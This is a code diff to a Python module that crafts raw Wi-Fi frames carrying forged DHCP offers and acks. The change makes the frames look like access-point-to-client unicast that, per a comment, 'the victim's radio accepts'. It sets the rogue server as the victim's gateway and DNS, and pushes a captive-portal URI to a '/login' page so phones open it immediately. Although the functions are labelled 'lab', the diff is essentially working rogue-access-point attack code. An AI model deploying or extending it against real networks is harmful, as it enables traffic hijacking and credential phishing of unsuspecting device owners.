@@ -239,9 +239,11 @@ def build_lab_offer(
         yiaddr=yiaddr,
         server=server,
     )
+    # FromDS, unicast to the client: an AP->client reply the victim's radio accepts.
     return _ipv4_udp_frame(
-        bssid, client_mac, b"\xff" * 6,
+        bssid, client_mac, client_mac,
         server, "255.255.255.255", 67, 68, body, xid & 0xFFFF,
+        from_ds=True,
     )
 
 
@@ -261,9 +263,11 @@ def build_lab_ack(
         yiaddr=client_ip,
         server=server,
     )
+    # FromDS, unicast to the client (see build_lab_offer).
     return _ipv4_udp_frame(
-        bssid, client_mac, b"\xff" * 6,
+        bssid, client_mac, client_mac,
         server, "255.255.255.255", 67, 68, body, xid & 0xFFFF,
+        from_ds=True,
     )
 
 
@@ -280,13 +284,19 @@ def _lab_dhcp_reply(
     bootp[4:8] = struct.pack("!I", xid)
     bootp[16:20] = ipaddress.IPv4Address(yiaddr).packed
     bootp[28:34] = client_mac
+    server_ip = ipaddress.IPv4Address(server).packed
+    # RFC 8910: hand the captive-portal URL straight to the client so iOS 14+/
+    # Android 11+ surface the login page immediately, without waiting on a probe.
+    portal_uri = f"http://{server}/login".encode("ascii")
     options = (
-        bytes([0x35, 0x01, message_type])
-        + b"\x01\x04" + ipaddress.IPv4Address(_LAB_DHCP_MASK).packed
-        + b"\x03\x04" + ipaddress.IPv4Address(server).packed
-        + b"\x36\x04" + ipaddress.IPv4Address(server).packed
-        + b"\x33\x04" + struct.pack("!I", _LAB_DHCP_LEASE_SECONDS)
-        + b"\x3d\x07\x01" + client_mac
+        bytes([0x35, 0x01, message_type])                        # DHCP message type
+        + b"\x01\x04" + ipaddress.IPv4Address(_LAB_DHCP_MASK).packed  # subnet mask
+        + b"\x03\x04" + server_ip                                # router / gateway
+        + b"\x06\x04" + server_ip                                # DNS server (was MISSING)
+        + b"\x36\x04" + server_ip                                # server identifier
+        + b"\x33\x04" + struct.pack("!I", _LAB_DHCP_LEASE_SECONDS)    # lease time
+        + bytes([114, len(portal_uri)]) + portal_uri             # captive-portal URI (RFC 8910)
+        + b"\x3d\x07\x01" + client_mac                           # client identifier
         + b"\xff"
     )
     return (bytes(bootp) + DHCP_COOKIE + options).ljust(300, b"\x00")
@@ -354,6 +364,8 @@ def _ipv4_udp_frame(
     dest_port: int,
     body: bytes,
     ident: int,
+    *,
+    from_ds: bool = False,
 ) -> bytes:
     udp_len = 8 + len(body)
     udp = struct.pack("!HHHH", source_port, dest_port, udp_len, 0) + body
@@ -367,7 +379,12 @@ def _ipv4_udp_frame(
         + ipaddress.IPv4Address(dest_ip).packed
     )
     ipv4[10:12] = struct.pack("!H", _checksum(ipv4))
-    header = mac_header(b"\x08\x01", bssid, client_mac, next_hop_mac)
+    if from_ds:
+        # AP -> client: addr1=client (RA/DA), addr2=bssid (TA), addr3=bssid (SA).
+        header = mac_header(b"\x08\x02", client_mac, bssid, bssid)
+    else:
+        # client -> AP (ToDS): addr1=bssid (RA), addr2=client (TA), addr3=next hop (DA).
+        header = mac_header(b"\x08\x01", bssid, client_mac, next_hop_mac)
     return header + LLC_SNAP_IPV4 + bytes(ipv4) + udp
 
 
